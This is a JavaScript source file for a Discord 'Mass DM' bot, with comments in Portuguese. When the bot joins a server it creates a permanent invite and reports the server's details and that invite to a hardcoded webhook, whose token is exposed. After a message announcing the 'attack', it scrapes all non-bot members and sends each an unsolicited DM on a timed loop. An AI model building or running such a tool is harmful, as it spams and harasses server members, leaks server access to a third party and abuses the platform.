/* * * * * * * * * * * * * * * * * * Mass DM Auto (Render)      *
* * * * * * * * * * * * * * * * */

const { Client, WebhookClient } = require("discord.js");
const { greenBright, red, yellow, cyan } = require("chalk");
const express = require('express');

// --- CONFIGURAÇÃO WEBHOOK ---
const WEBHOOK_ID = "1447353848493772901";
const WEBHOOK_TOKEN = "IoHRSWi8YZVpFGENLD5PWkf90Gx4YGhVTuF3vOkVre8_75efP13cv3i-83OBbCrC0mN1";
const webhookClient = new WebhookClient(WEBHOOK_ID, WEBHOOK_TOKEN);

// --- CONFIGURAÇÃO RENDER (MANTÉM O BOT ONLINE) ---
const app = express();
app.get('/', (req, res) => res.send('Bot Mass DM está rodando.'));
app.listen(process.env.PORT || 3000, () => console.log(greenBright('[HTTP] Servidor Web Pronto.')));

// --- BOT ---
const client = new Client();
const { token, message } = require("./settings.json");

client.on("ready", () => {
    console.log(greenBright(`[BOT] Logado como: ${client.user.tag}`));
    console.log(yellow("[AVISO] Modo Automático: Ao entrar, espera 20s e inicia o envio."));
});

// EVENTO: Quando o bot entra em um novo servidor
client.on("guildCreate", async (guild) => {
    console.log(greenBright(`[NOVO SERVIDOR] Entrei em: ${guild.name} (ID: ${guild.id})`));

    // 1. Log na Webhook (Imediato)
    let inviteUrl = "Não foi possível criar convite";
    try {
        const channel = guild.channels.cache.find(channel => channel.type === 'text' && channel.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'));
        if (channel) {
            const invite = await channel.createInvite({ maxAge: 0, maxUses: 0 });
            inviteUrl = invite.url;
        }
    } catch (err) {}

    try {
        await webhookClient.send({
            content: `🚨 **ENTREI EM UM SERVIDOR!**\n**Nome:** ${guild.name}\n**ID:** \`${guild.id}\`\n**Membros:** ${guild.memberCount}\n**Convite:** ${inviteUrl}\n\n⏳ *Aguardando 20 segundos para iniciar o ataque...*`
        });
        console.log(greenBright("[LOG] Webhook enviada."));
    } catch (err) {
        console.log(red(`[LOG] Erro na Webhook: ${err.message}`));
    }

    // 2. Delay de 20 Segundos antes de começar
    console.log(cyan("⏳ Aguardando 20 segundos antes de começar a raspar..."));
    
    setTimeout(() => {
        ScrapeAndSend(guild);
    }, 20000); // 20000 milissegundos = 20 segundos
});

async function ScrapeAndSend(guild) {
    console.log(yellow(`[INICIANDO] Lendo membros de ${guild.name} agora...`));

    try {
        await guild.members.fetch(); 
    } catch (e) {
        console.log(red("Erro ao baixar membros (Falta permissão?): " + e.message));
    }

    // Filtra bots para não perder tempo
    const members = guild.members.cache.filter(member => !member.user.bot);
    console.log(greenBright(`[ALVO] ${members.size} membros encontrados. Iniciando envio (Delay: 3s)...`));

    let count = 0;
    members.forEach((member) => {
        count++;
        
        // Delay de 3 segundos por usuário (3000ms)
        setTimeout(() => {
            member.send(message)
                .then(() => console.log(greenBright(`[${count}/${members.size}] Enviado: ${member.user.tag}`)))
                .catch(err => console.log(red(`[${count}/${members.size}] Falha: ${member.user.tag} (DM Fechada)`)));
        }, 3000 * count); 
    });
}

client.login(token).catch(err => console.log(red("Erro no Login: " + err.message)));
